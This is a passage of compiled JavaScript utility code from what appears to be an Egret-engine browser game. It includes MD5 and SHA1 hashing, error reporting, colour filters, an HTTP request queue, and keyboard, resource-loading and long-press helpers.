            d = this.md5_gg(d, a, b, c, x[i + 14], 9, -1019803690);
            c = this.md5_gg(c, d, a, b, x[i + 3], 14, -187363961);
            b = this.md5_gg(b, c, d, a, x[i + 8], 20, 1163531501);
            a = this.md5_gg(a, b, c, d, x[i + 13], 5, -1444681467);
            d = this.md5_gg(d, a, b, c, x[i + 2], 9, -51403784);
            c = this.md5_gg(c, d, a, b, x[i + 7], 14, 1735328473);
            b = this.md5_gg(b, c, d, a, x[i + 12], 20, -1926607734);
            a = this.md5_hh(a, b, c, d, x[i + 5], 4, -378558);
            d = this.md5_hh(d, a, b, c, x[i + 8], 11, -2022574463);
            c = this.md5_hh(c, d, a, b, x[i + 11], 16, 1839030562);
            b = this.md5_hh(b, c, d, a, x[i + 14], 23, -35309556);
            a = this.md5_hh(a, b, c, d, x[i + 1], 4, -1530992060);
            d = this.md5_hh(d, a, b, c, x[i + 4], 11, 1272893353);
            c = this.md5_hh(c, d, a, b, x[i + 7], 16, -155497632);
            b = this.md5_hh(b, c, d, a, x[i + 10], 23, -1094730640);
            a = this.md5_hh(a, b, c, d, x[i + 13], 4, 681279174);
            d = this.md5_hh(d, a, b, c, x[i + 0], 11, -358537222);
            c = this.md5_hh(c, d, a, b, x[i + 3], 16, -722521979);
            b = this.md5_hh(b, c, d, a, x[i + 6], 23, 76029189);
            a = this.md5_hh(a, b, c, d, x[i + 9], 4, -640364487);
            d = this.md5_hh(d, a, b, c, x[i + 12], 11, -421815835);
            c = this.md5_hh(c, d, a, b, x[i + 15], 16, 530742520);
            b = this.md5_hh(b, c, d, a, x[i + 2], 23, -995338651);
            a = this.md5_ii(a, b, c, d, x[i + 0], 6, -198630844);
            d = this.md5_ii(d, a, b, c, x[i + 7], 10, 1126891415);
            c = this.md5_ii(c, d, a, b, x[i + 14], 15, -1416354905);
            b = this.md5_ii(b, c, d, a, x[i + 5], 21, -57434055);
            a = this.md5_ii(a, b, c, d, x[i + 12], 6, 1700485571);
            d = this.md5_ii(d, a, b, c, x[i + 3], 10, -1894986606);
            c = this.md5_ii(c, d, a, b, x[i + 10], 15, -1051523);
            b = this.md5_ii(b, c, d, a, x[i + 1], 21, -2054922799);
            a = this.md5_ii(a, b, c, d, x[i + 8], 6, 1873313359);
            d = this.md5_ii(d, a, b, c, x[i + 15], 10, -30611744);
            c = this.md5_ii(c, d, a, b, x[i + 6], 15, -1560198380);
            b = this.md5_ii(b, c, d, a, x[i + 13], 21, 1309151649);
            a = this.md5_ii(a, b, c, d, x[i + 4], 6, -145523070);
            d = this.md5_ii(d, a, b, c, x[i + 11], 10, -1120210379);
            c = this.md5_ii(c, d, a, b, x[i + 2], 15, 718787259);
            b = this.md5_ii(b, c, d, a, x[i + 9], 21, -343485551);
            a = this.safe_add(a, olda);
            b = this.safe_add(b, oldb);
            c = this.safe_add(c, oldc);
            d = this.safe_add(d, oldd);
        }
        return [a, b, c, d];
    };
    EncryptMd5.md5_cmn = function (q, a, b, x, s, t) {
        return this.safe_add(this.bit_rol(this.safe_add(this.safe_add(a, q), this.safe_add(x, t)), s), b);
    };
    EncryptMd5.md5_ff = function (a, b, c, d, x, s, t) {
        return this.md5_cmn((b & c) | ((~b) & d), a, b, x, s, t);
    };
    EncryptMd5.md5_gg = function (a, b, c, d, x, s, t) {
        return this.md5_cmn((b & d) | (c & (~d)), a, b, x, s, t);
    };
    EncryptMd5.md5_hh = function (a, b, c, d, x, s, t) {
        return this.md5_cmn(b ^ c ^ d, a, b, x, s, t);
    };
    EncryptMd5.md5_ii = function (a, b, c, d, x, s, t) {
        return this.md5_cmn(c ^ (b | (~d)), a, b, x, s, t);
    };
    EncryptMd5.safe_add = function (x, y) {
        var lsw = (x & 0xFFFF) + (y & 0xFFFF);
        var msw = (x >> 16) + (y >> 16) + (lsw >> 16);
        return (msw << 16) | (lsw & 0xFFFF);
    };
    EncryptMd5.bit_rol = function (num, cnt) {
        return (num << cnt) | (num >>> (32 - cnt));
    };
    EncryptMd5.hexcase = 0;
    EncryptMd5.b64pad = "";
    return EncryptMd5;
}());
__reflect(EncryptMd5.prototype, "EncryptMd5");
var EncryptSha1 = (function () {
    function EncryptSha1() {
    }
    EncryptSha1.hex_sha1 = function (s) {
        return this.rstr2hex(this.rstr_sha1(this.str2rstr_utf8(s)));
    };
    EncryptSha1.b64_sha1 = function (s) {
        return this.rstr2b64(this.rstr_sha1(this.str2rstr_utf8(s)));
    };
    EncryptSha1.any_sha1 = function (s, e) {
        return this.rstr2any(this.rstr_sha1(this.str2rstr_utf8(s)), e);
    };
    EncryptSha1.hex_hmac_sha1 = function (k, d) {
        return this.rstr2hex(this.rstr_hmac_sha1(this.str2rstr_utf8(k), this.str2rstr_utf8(d)));
    };
    EncryptSha1.b64_hmac_sha1 = function (k, d) {
        return this.rstr2b64(this.rstr_hmac_sha1(this.str2rstr_utf8(k), this.str2rstr_utf8(d)));
    };
    EncryptSha1.any_hmac_sha1 = function (k, d, e) {
        return this.rstr2any(this.rstr_hmac_sha1(this.str2rstr_utf8(k), this.str2rstr_utf8(d)), e);
    };
    EncryptSha1.sha1_vm_test = function () {
        return this.hex_sha1("abc").toLowerCase() == "a9993e364706816aba3e25717850c26c9cd0d89d";
    };
    EncryptSha1.rstr_sha1 = function (s) {
        return this.binb2rstr(this.binb_sha1(this.rstr2binb(s), s.length * 8));
    };
    EncryptSha1.rstr_hmac_sha1 = function (key, data) {
        var bkey = this.rstr2binb(key);
        if (bkey.length > 16)
            bkey = this.binb_sha1(bkey, key.length * 8);
        var ipad = Array(16), opad = Array(16);
        for (var i = 0; i < 16; i++) {
            ipad[i] = bkey[i] ^ 0x36363636;
            opad[i] = bkey[i] ^ 0x5C5C5C5C;
        }
        var hash = this.binb_sha1(ipad.concat(this.rstr2binb(data)), 512 + data.length * 8);
        return this.binb2rstr(this.binb_sha1(opad.concat(hash), 512 + 160));
    };
    EncryptSha1.rstr2hex = function (input) {
        try {
            this.hexcase;
        }
        catch (e) {
            this.hexcase = 0;
        }
        var hex_tab = this.hexcase ? "0123456789ABCDEF" : "0123456789abcdef";
        var output = "";
        var x;
        for (var i = 0; i < input.length; i++) {
            x = input.charCodeAt(i);
            output += hex_tab.charAt((x >>> 4) & 0x0F) + hex_tab.charAt(x & 0x0F);
        }
        return output;
    };
    EncryptSha1.rstr2b64 = function (input) {
        try {
            this.b64pad;
        }
        catch (e) {
            this.b64pad = '';
        }
        var tab = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        var output = "";
        var len = input.length;
        for (var i = 0; i < len; i += 3) {
            var triplet = (input.charCodeAt(i) << 16) | (i + 1 < len ? input.charCodeAt(i + 1) << 8 : 0) | (i + 2 < len ? input.charCodeAt(i + 2) : 0);
            for (var j = 0; j < 4; j++) {
                if (i * 8 + j * 6 > input.length * 8)
                    output += this.b64pad;
                else
                    output += tab.charAt((triplet >>> 6 * (3 - j)) & 0x3F);
            }
        }
        return output;
    };
    EncryptSha1.rstr2any = function (input, encoding) {
        var divisor = encoding.length;
        var remainders = Array();
        var i, q, x, quotient;
        var dividend = Array(Math.ceil(input.length / 2));
        for (i = 0; i < dividend.length; i++) {
            dividend[i] = (input.charCodeAt(i * 2) << 8) | input.charCodeAt(i * 2 + 1);
        }
        while (dividend.length > 0) {
            quotient = Array();
            x = 0;
            for (i = 0; i < dividend.length; i++) {
                x = (x << 16) + dividend[i];
                q = Math.floor(x / divisor);
                x -= q * divisor;
                if (quotient.length > 0 || q > 0)
                    quotient[quotient.length] = q;
            }
            remainders[remainders.length] = x;
            dividend = quotient;
        }
        var output = "";
        for (i = remainders.length - 1; i >= 0; i--)
            output += encoding.charAt(remainders[i]);
        var full_length = Math.ceil(input.length * 8 / (Math.log(encoding.length) / Math.log(2)));
        for (i = output.length; i < full_length; i++)
            output = encoding[0] + output;
        return output;
    };
    EncryptSha1.str2rstr_utf8 = function (input) {
        var output = "";
        var i = -1;
        var x, y;
        while (++i < input.length) {
            x = input.charCodeAt(i);
            y = i + 1 < input.length ? input.charCodeAt(i + 1) : 0;
            if (0xD800 <= x && x <= 0xDBFF && 0xDC00 <= y && y <= 0xDFFF) {
                x = 0x10000 + ((x & 0x03FF) << 10) + (y & 0x03FF);
                i++;
            }
            if (x <= 0x7F)
                output += String.fromCharCode(x);
            else if (x <= 0x7FF)
                output += String.fromCharCode(0xC0 | ((x >>> 6) & 0x1F), 0x80 | (x & 0x3F));
            else if (x <= 0xFFFF)
                output += String.fromCharCode(0xE0 | ((x >>> 12) & 0x0F), 0x80 | ((x >>> 6) & 0x3F), 0x80 | (x & 0x3F));
            else if (x <= 0x1FFFFF)
                output += String.fromCharCode(0xF0 | ((x >>> 18) & 0x07), 0x80 | ((x >>> 12) & 0x3F), 0x80 | ((x >>> 6) & 0x3F), 0x80 | (x & 0x3F));
        }
        return output;
    };
    EncryptSha1.str2rstr_utf16le = function (input) {
        var output = "";
        for (var i = 0; i < input.length; i++)
            output += String.fromCharCode(input.charCodeAt(i) & 0xFF, (input.charCodeAt(i) >>> 8) & 0xFF);
        return output;
    };
    EncryptSha1.str2rstr_utf16be = function (input) {
        var output = "";
        for (var i = 0; i < input.length; i++)
            output += String.fromCharCode((input.charCodeAt(i) >>> 8) & 0xFF, input.charCodeAt(i) & 0xFF);
        return output;
    };
    EncryptSha1.rstr2binb = function (input) {
        var output = Array(input.length >> 2);
        for (var i = 0; i < output.length; i++)
            output[i] = 0;
        for (var i = 0; i < input.length * 8; i += 8)
            output[i >> 5] |= (input.charCodeAt(i / 8) & 0xFF) << (24 - i % 32);
        return output;
    };
    EncryptSha1.binb2rstr = function (input) {
        var output = "";
        for (var i = 0; i < input.length * 32; i += 8)
            output += String.fromCharCode((input[i >> 5] >>> (24 - i % 32)) & 0xFF);
        return output;
    };
    EncryptSha1.binb_sha1 = function (x, len) {
        x[len >> 5] |= 0x80 << (24 - len % 32);
        x[((len + 64 >> 9) << 4) + 15] = len;
        var w = Array(80);
        var a = 1732584193;
        var b = -271733879;
        var c = -1732584194;
        var d = 271733878;
        var e = -1009589776;
        for (var i = 0; i < x.length; i += 16) {
            var olda = a;
            var oldb = b;
            var oldc = c;
            var oldd = d;
            var olde = e;
            for (var j = 0; j < 80; j++) {
                if (j < 16)
                    w[j] = x[i + j];
                else
                    w[j] = this.bit_rol(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1);
                var t = this.safe_add(this.safe_add(this.bit_rol(a, 5), this.sha1_ft(j, b, c, d)), this.safe_add(this.safe_add(e, w[j]), this.sha1_kt(j)));
                e = d;
                d = c;
                c = this.bit_rol(b, 30);
                b = a;
                a = t;
            }
            a = this.safe_add(a, olda);
            b = this.safe_add(b, oldb);
            c = this.safe_add(c, oldc);
            d = this.safe_add(d, oldd);
            e = this.safe_add(e, olde);
        }
        return [a, b, c, d, e];
    };
    EncryptSha1.sha1_ft = function (t, b, c, d) {
        if (t < 20)
            return (b & c) | ((~b) & d);
        if (t < 40)
            return b ^ c ^ d;
        if (t < 60)
            return (b & c) | (b & d) | (c & d);
        return b ^ c ^ d;
    };
    EncryptSha1.sha1_kt = function (t) {
        return (t < 20) ? 1518500249 : (t < 40) ? 1859775393 :
            (t < 60) ? -1894007588 : -899497514;
    };
    EncryptSha1.safe_add = function (x, y) {
        var lsw = (x & 0xFFFF) + (y & 0xFFFF);
        var msw = (x >> 16) + (y >> 16) + (lsw >> 16);
        return (msw << 16) | (lsw & 0xFFFF);
    };
    EncryptSha1.bit_rol = function (num, cnt) {
        return (num << cnt) | (num >>> (32 - cnt));
    };
    EncryptSha1.hexcase = 0;
    EncryptSha1.b64pad = "";
    return EncryptSha1;
}());
__reflect(EncryptSha1.prototype, "EncryptSha1");
var ErrorUtils = (function () {
    function ErrorUtils() {
        this.stackObj = { stack: "" };
    }
    ErrorUtils.ins = function () {
        this._ins = this._ins || new ErrorUtils();
        return this._ins;
    };
    ErrorUtils.prototype.show = function (str) {
        var tapFun = function () {
            this.removeEventTouchTap(this['notBtn'], tapFun);
            if (this.parent) {
                this.parent.removeChild(this);
            }
        };
        var view = new BaseEuiView();
        view.skinName = 'ErrorSkin';
        view.addEventTouchTap(view['notBtn'], tapFun, view);
        view['lab'].text = str;
        StageUtils.ins().getUIStage().addChild(view);
    };
    ErrorUtils.Assert = function (expr, msg) {
        if (expr)
            return false;
        msg += ErrorUtils.ins().getErrorStackInfo();
        debug.log(msg);
        return true;
    };
    ErrorUtils.prototype.getErrorStackInfo = function () {
        var info = "";
        try {
            Error['captureStackTrace'](this.stackObj, ErrorUtils.Assert);
            info = "----" + this.stackObj.stack;
            this.stackObj.stack = "";
        }
        catch (e) {
            info = "";
        }
        return info;
    };
    return ErrorUtils;
}());
__reflect(ErrorUtils.prototype, "ErrorUtils");
var Assert = ErrorUtils.Assert;
window.onerror = function () {
    var info = [];
    for (var _i = 0; _i < arguments.length; _i++) {
        info[_i] = arguments[_i];
    }
    var errorMessage = info[0];
    var lineNumber = info[2];
    var columnNumber = info[3];
    var errorObj = info[4];
    var stackStr = '';
    if (lineNumber && columnNumber && errorObj && errorObj.stack) {
        var list = errorObj.stack.split("at ");
        for (var i = 1; i < list.length; i++) {
            stackStr += list[i].split(" ")[0] + "\n";
        }
        var resultStr = errorMessage + "\n" + stackStr;
        ReportData.getIns().reportClientErrorLog("WindowOnerror", resultStr);
        alert(resultStr);
        GlobalModel.checkClientVersion();
    }
};
var FilterUtils = (function () {
    function FilterUtils() {
    }
    Object.defineProperty(FilterUtils, "grayFilter", {
        get: function () {
            return new egret.ColorMatrixFilter([0.3, 0.6, 0, 0, 0, 0.3, 0.6, 0, 0, 0, 0.3, 0.6, 0, 0, 0, 0, 0, 0, 1, 0]);
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(FilterUtils, "grayFilter1", {
        get: function () {
            return new egret.ColorMatrixFilter([0.3086, 0.5, 0.0820, 0, 0, 0.3086, 0.5, 0.0820, 0, 0, 0.3086, 0.5, 0.0820, 0, 0, 0, 0, 0, 1, 0]);
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(FilterUtils, "ARRAY_GRAY_FILTER", {
        get: function () {
            return DeviceUtils.isWebgl ? [FilterUtils.grayFilter1] : null;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(FilterUtils, "redFilter", {
        get: function () {
            return new egret.ColorMatrixFilter([1, 0.5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0]);
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(FilterUtils, "greenFilter", {
        get: function () {
            return new egret.ColorMatrixFilter([1, 0, 0, 0, 0, 0, 1, 0, 0, 100, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0]);
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(FilterUtils, "greenFilter1", {
        get: function () {
            return new egret.ColorMatrixFilter([0.1, 0, 0, 0, 0, 0, 0.80078125, 0, 0, 20, 0, 0, -1, 0, 0, 0, 0, 0, 1, 0]);
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(FilterUtils, "ARRAY_GREEN_FILTER", {
        get: function () {
            return DeviceUtils.isWebgl ? [FilterUtils.greenFilter1] : null;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(FilterUtils, "ARRAY_RED_FILTER", {
        get: function () {
            return DeviceUtils.isWebgl ? [FilterUtils.redFilter] : null;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(FilterUtils, "blurFilter", {
        get: function () {
            return new egret.BlurFilter(10, 10, 2);
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(FilterUtils, "ARRAY_BLUR_FILTER", {
        get: function () {
            return DeviceUtils.isWebgl ? [FilterUtils.blurFilter] : null;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(FilterUtils, "darkFilter", {
        get: function () {
            return new egret.ColorMatrixFilter([.3, 0, 0, 0, 0, 0, .3, 0, 0, 0, 0, 0, .3, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1]);
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(FilterUtils, "ARRAY_DARK_FILTER", {
        get: function () {
            return DeviceUtils.isWebgl ? [FilterUtils.darkFilter] : null;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(FilterUtils, "shadowFilter", {
        get: function () {
            return DeviceUtils.isWebgl ? [new egret.CustomFilter(this.shadowVertexSrc, this.shadowFragmentSrc)] : null;
        },
        enumerable: true,
        configurable: true
    });
    FilterUtils.clearFilter = function (target, filterType) {
        var filters = target.filters;
        if (filters != null && filters.length > 0) {
            for (var i = filters.length - 1; i > -1; i--) {
                var filter = filters[i];
                if (filter instanceof filterType) {
                    filters.splice(i, 1);
                }
            }
            target.filters = filters;
        }
    };
    FilterUtils.clearColorFilter = function (target) {
        FilterUtils.clearFilter(target, egret.ColorMatrixFilter);
    };
    FilterUtils.shadowVertexSrc = "attribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\nuniform vec2 projectionVector;\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nconst vec2 center = vec2(-1.0, 1.0);\nvoid main(void) {\n   gl_Position = vec4( (aVertexPosition / projectionVector) + center , 0.0, 1.0);\n   vTextureCoord = aTextureCoord;\n}";
    FilterUtils.shadowFragmentSrc = "precision lowp float;\nvarying vec2 vTextureCoord;\nuniform sampler2D uSampler;\nvoid main(void) {\nvec4 texColor = texture2D(uSampler, vTextureCoord);\ngl_FragColor = vec4(0,0,0,texColor.w * 0.6);\n}";
    return FilterUtils;
}());
__reflect(FilterUtils.prototype, "FilterUtils");
var HttpUtils = (function () {
    function HttpUtils() {
        this.isComplete = false;
        this.httpRequest = new egret.HttpRequest();
        this.httpRequestInfos = [];
    }
    HttpUtils.getIns = function () {
        this._ins = this._ins || new HttpUtils();
        return this._ins;
    };
    HttpUtils.prototype.sendUrl = function (url, params, method, thisObject, completeListener, errorListener, errcode, sendCount, responseType) {
        var argArray = [];
        for (var _i = 9; _i < arguments.length; _i++) {
            argArray[_i - 9] = arguments[_i];
        }
        var vo = new HttpReqInfo();
        vo.url = url;
        vo.params = params;
        vo.method = method;
        vo.thisObject = thisObject;
        vo.completeListener = completeListener;
        vo.errcode = errcode;
        vo.errorListener = errorListener;
        vo.sendCount = sendCount || 3;
        vo.responseType = responseType;
        vo.argArray = argArray;
        this.httpRequestInfos.push(vo);
        this.sendReportUrl();
    };
    HttpUtils.prototype.sendReportUrl = function () {
        if (this.isComplete == false && this.httpRequestInfos.length > 0) {
            var url = this.httpRequestInfos[0].url;
            var params = this.httpRequestInfos[0].params;
            var method = this.httpRequestInfos[0].method;
            var responseType = this.httpRequestInfos[0].responseType;
            this.httpRequest.responseType = responseType ? responseType : egret.HttpResponseType.TEXT;
            this.httpRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8");
            if (method == egret.HttpMethod.POST) {
                this.httpRequest.open(url, egret.HttpMethod.POST);
                this.httpRequest.send(params);
            }
            else {
                this.httpRequest.open(params ? url + "?" + params : url, egret.HttpMethod.GET);
                this.httpRequest.send();
            }
            this.isComplete = true;
            this.httpRequest.addEventListener(egret.Event.COMPLETE, this.onGetComplete, this);
            this.httpRequest.addEventListener(egret.IOErrorEvent.IO_ERROR, this.onGetIOError, this);
        }
    };
    HttpUtils.prototype.onGetComplete = function (event) {
        var responseJson = null;
        try {
            responseJson = JSON.parse(event.currentTarget.response);
        }
        catch (error) {
            ReportData.getIns().reportClientErrorLog("JsonError", this.httpRequestInfos[0].url);
        }
        if (responseJson && this.httpRequestInfos[0].errcode && this.httpRequestInfos[0].errcode != responseJson["errcode"]) {
            this.onGetIOError(event);
        }
        else {
            this.isComplete = false;
            this.onCallback(this.httpRequestInfos.shift(), event, true);
            this.sendReportUrl();
        }
    };
    HttpUtils.prototype.onGetIOError = function (event) {
        this.isComplete = false;
        this.httpRequestInfos[0].sendCount--;
        if (this.httpRequestInfos[0].sendCount <= 0) {
            this.onCallback(this.httpRequestInfos.shift(), event, false);
        }
        this.sendReportUrl();
    };
    HttpUtils.prototype.onCallback = function (hrInfo, event, success) {
        hrInfo.argArray.unshift(event);
        if (success) {
            if (hrInfo.completeListener) {
                hrInfo.completeListener.apply(hrInfo.thisObject, hrInfo.argArray);
            }
        }
        else {
            if (hrInfo.errorListener) {
                hrInfo.errorListener.apply(hrInfo.thisObject, hrInfo.argArray);
            }
        }
    };
    return HttpUtils;
}());
__reflect(HttpUtils.prototype, "HttpUtils");
var HttpReqInfo = (function () {
    function HttpReqInfo() {
    }
    return HttpReqInfo;
}());
__reflect(HttpReqInfo.prototype, "HttpReqInfo");
var Keyboard = (function () {
    function Keyboard() {
    }
    Keyboard.LEFT = 37;
    Keyboard.UP = 38;
    Keyboard.RIGHT = 39;
    Keyboard.DOWN = 40;
    Keyboard.KC_1 = 49;
    Keyboard.KC_2 = 50;
    Keyboard.KC_3 = 51;
    Keyboard.KC_4 = 52;
    Keyboard.KC_5 = 53;
    Keyboard.KC_6 = 54;
    Keyboard.KC_7 = 55;
    Keyboard.KC_8 = 56;
    Keyboard.KC_9 = 57;
    Keyboard.KC_0 = 48;
    Keyboard.A = 65;
    Keyboard.B = 66;
    Keyboard.C = 67;
    Keyboard.D = 68;
    Keyboard.E = 69;
    Keyboard.F = 70;
    Keyboard.G = 71;
    Keyboard.H = 72;
    Keyboard.I = 73;
    Keyboard.J = 74;
    Keyboard.K = 75;
    Keyboard.L = 76;
    Keyboard.M = 77;
    Keyboard.N = 78;
    Keyboard.O = 79;
    Keyboard.P = 80;
    Keyboard.Q = 81;
    Keyboard.R = 82;
    Keyboard.S = 83;
    Keyboard.T = 84;
    Keyboard.U = 85;
    Keyboard.V = 86;
    Keyboard.W = 87;
    Keyboard.X = 88;
    Keyboard.Y = 89;
    Keyboard.Z = 90;
    Keyboard.SPACE = 32;
    Keyboard.BRACE_L = 219;
    Keyboard.BACKSLASH = 220;
    Keyboard.BRACE_R = 221;
    Keyboard.BACK_QUOTE = 192;
    Keyboard.ENTER = 13;
    Keyboard.KC_BACKSPACE = 8;
    Keyboard.KC_TAB = 9;
    Keyboard.KC_ENTER = 13;
    Keyboard.KC_SHIFT = 16;
    Keyboard.KC_CONTROL = 17;
    Keyboard.KC_ESCAPE = 27;
    Keyboard.KC_SPACE = 32;
    Keyboard.KC_WINDOWS = 91;
    Keyboard.KC_MENU = 93;
    return Keyboard;
}());
__reflect(Keyboard.prototype, "Keyboard");
var KeyboardUtils = (function (_super) {
    __extends(KeyboardUtils, _super);
    function KeyboardUtils() {
        var _this = _super.call(this) || this;
        _this.key_ups = new Array();
        _this.key_downs = new Array();
        var self = _this;
        document.addEventListener("keyup", function (e) {
            for (var i = 0, len = self.key_ups.length; i < len; i++) {
                var func = self.key_ups[i][0];
                var target = self.key_ups[i][1];
                if (target) {
                    func.call(target, e["keyCode"]);
                }
                else {
                    func(e["keyCode"]);
                }
            }
        });
        document.addEventListener("keydown", function (e) {
            for (var i = 0, len = self.key_downs.length; i < len; i++) {
                var func = self.key_downs[i][0];
                var target = self.key_downs[i][1];
                if (target) {
                    func.call(target, e["keyCode"]);
                }
                else {
                    func(e["keyCode"]);
                }
            }
        });
        return _this;
    }
    KeyboardUtils.ins = function () {
        return _super.ins.call(this);
    };
    KeyboardUtils.prototype.addKeyUp = function (callback, target) {
        this.key_ups.push([callback, target]);
    };
    KeyboardUtils.prototype.addKeyDown = function (callback, target) {
        this.key_downs.push([callback, target]);
    };
    KeyboardUtils.prototype.removeKeyUp = function (callback, target) {
        for (var i = 0; i < this.key_ups.length; i++) {
            if (this.key_ups[i][0] == callback && this.key_ups[i][1] == target) {
                this.key_ups.splice(i, 1);
                i--;
            }
        }
    };
    KeyboardUtils.prototype.removeKeyDown = function (callback, target) {
        for (var i = 0; i < this.key_downs.length; i++) {
            if (this.key_downs[i][0] == callback && this.key_downs[i][1] == target) {
                this.key_downs.splice(i, 1);
                i--;
            }
        }
    };
    return KeyboardUtils;
}(SingleClass));
__reflect(KeyboardUtils.prototype, "KeyboardUtils");
var LoadUtils = (function (_super) {
    __extends(LoadUtils, _super);
    function LoadUtils() {
        var _this = _super.call(this) || this;
        _this._load_count = 0;
        _this._configs = new Array();
        _this._groups = {};
        RES.addEventListener(RES.ResourceEvent.GROUP_COMPLETE, _this.onResourceLoadComplete, _this);
        RES.addEventListener(RES.ResourceEvent.GROUP_PROGRESS, _this.onResourceLoadProgress, _this);
        RES.addEventListener(RES.ResourceEvent.GROUP_LOAD_ERROR, _this.onResourceLoadError, _this);
        return _this;
    }
    LoadUtils.ins = function () {
        return _super.ins.call(this);
    };
    LoadUtils.prototype.addConfig = function (jsonPath, filePath) {
        this._configs.push([jsonPath, filePath]);
    };
    LoadUtils.prototype.loadConfig = function ($onConfigComplete, $onConfigCompleteTarget) {
        this._onConfigComplete = $onConfigComplete;
        this._onConfigCompleteTarget = $onConfigCompleteTarget;
        this.loadNextConfig();
    };
    LoadUtils.prototype.loadNextConfig = function () {
        if (this._configs.length == 0) {
            this._onConfigComplete.call(this._onConfigCompleteTarget);
            this._onConfigComplete = null;
            this._onConfigCompleteTarget = null;
            return;
        }
        var arr = this._configs.shift();
        RES.addEventListener(RES.ResourceEvent.CONFIG_COMPLETE, this.onConfigCompleteHandle, this);
        RES.loadConfig(arr[0], arr[1]);
    };
    LoadUtils.prototype.onConfigCompleteHandle = function (event) {
        RES.removeEventListener(RES.ResourceEvent.CONFIG_COMPLETE, this.onConfigCompleteHandle, this);
        this.loadNextConfig();
    };
    LoadUtils.prototype.loadGroup = function ($groupName, $onResourceLoadComplete, $onResourceLoadProgress, $onResourceLoadTarget) {
        this._groups[$groupName] = [$onResourceLoadComplete, $onResourceLoadProgress, $onResourceLoadTarget];
        RES.loadGroup($groupName);
    };
    LoadUtils.prototype.onResourceLoadComplete = function (event) {
        var groupName = event.groupName;
        if (this._groups[groupName]) {
            var loadComplete = this._groups[groupName][0];
            var loadCompleteTarget = this._groups[groupName][2];
            if (loadComplete != null) {
                loadComplete.call(loadCompleteTarget);
            }
            debug.log("Load complete:", groupName);
            this._groups[groupName] = null;
            delete this._groups[groupName];
        }
    };
    LoadUtils.prototype.onResourceLoadProgress = function (event) {
        var groupName = event.groupName;
        if (this._groups[groupName]) {
            var loadProgress = this._groups[groupName][1];
            var loadProgressTarget = this._groups[groupName][2];
            if (loadProgress != null) {
                loadProgress.call(loadProgressTarget, event.itemsLoaded, event.itemsTotal);
            }
        }
    };
    LoadUtils.prototype.onResourceLoadError = function (event) {
        debug.error(event.groupName + "Res load fail!!!");
        if (event.groupName == "preload") {
            this._load_count += 1;
            if (this._load_count < 3) {
                RES.loadGroup(event.groupName);
            }
            else {
                alert("Res load fail\uFF0CPlease check the network login again");
            }
            return;
        }
        this.onResourceLoadComplete(event);
    };
    return LoadUtils;
}(SingleClass));
__reflect(LoadUtils.prototype, "LoadUtils");
var LongPressUtils = (function (_super) {
    __extends(LongPressUtils, _super);
    function LongPressUtils() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this._targetDic = {};
        _this._delayTime = 0;
        _this._touchX = 0;
        _this._radius = 0;
        return _this;
    }
    LongPressUtils.ins = function () {
        return _super.ins.call(this);
    };
    LongPressUtils.prototype.addLongPress = function (obj, func, thisObj) {
        if (!this._targetDic[obj.hashCode]) {
            this._targetDic[obj.hashCode] = [obj, func, thisObj];
            obj.addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.onBegin, this);
        }
    };
    LongPressUtils.prototype.forceEndPress = function (target) {
        if (target === void 0) { target = null; }
        if (target && target == this._curTarget) {
            this._delayTime += LongPressUtils.DEALY;
            this.onEnd();
        }
    };
    LongPressUtils.prototype.onBegin = function (e) {
        this._touchX = e.$stageX;
        this._touchY = e.$stageY;
        this._delayTime = 0;
        this._curTarget = e.currentTarget;
        this._radius = Math.max(this._curTarget.width, this._curTarget.height, LongPressUtils.RADIUS);
        this._curTarget.addEventListener(egret.TouchEvent.TOUCH_END, this.onEnd, this);
        this._curTarget.addEventListener(egret.TouchEvent.TOUCH_RELEASE_OUTSIDE, this.onEnd, this);
        StageUtils.ins().getStage().addEventListener(egret.TouchEvent.TOUCH_MOVE, this.onMove, this);
        this.onRepeat();
        if (!TimerMgr.ins().isExists(this.onRepeat, this)) {
            TimerMgr.ins().doTimer(LongPressUtils.REPEAT, 0, this.onRepeat, this);
        }
    };
    LongPressUtils.prototype.onEnd = function () {
        StageUtils.ins().getStage().removeEventListener(egret.TouchEvent.TOUCH_MOVE, this.onMove, this);
        TimerMgr.ins().remove(this.onRepeat, this);
        if (this._curTarget) {
            this._curTarget.removeEventListener(egret.TouchEvent.TOUCH_END, this.onEnd, this);
            this._curTarget.removeEventListener(egret.TouchEvent.TOUCH_RELEASE_OUTSIDE, this.onEnd, this);
            var target = this._targetDic[this._curTarget.hashCode];
            if (target && this._delayTime <= LongPressUtils.DEALY) {
                target[1].call(target[2], target[0]);
            }
            this._curTarget = null;
        }
    };
    LongPressUtils.prototype.removeLongPress = function (hashCode) {
        if (this._targetDic[hashCode]) {
            var obj = this._targetDic[hashCode][0];
            obj.removeEventListener(egret.TouchEvent.TOUCH_BEGIN, this.onBegin, this);
            obj.removeEventListener(egret.TouchEvent.TOUCH_END, this.onEnd, this);
            obj.removeEventListener(egret.TouchEvent.TOUCH_RELEASE_OUTSIDE, this.onEnd, this);
            StageUtils.ins().getStage().removeEventListener(egret.TouchEvent.TOUCH_MOVE, this.onMove, this);
            TimerMgr.ins().remove(this.onRepeat, this);
            delete this._targetDic[hashCode];
            this._curTarget = null;
        }
    };
    LongPressUtils.prototype.onRepeat = function () {
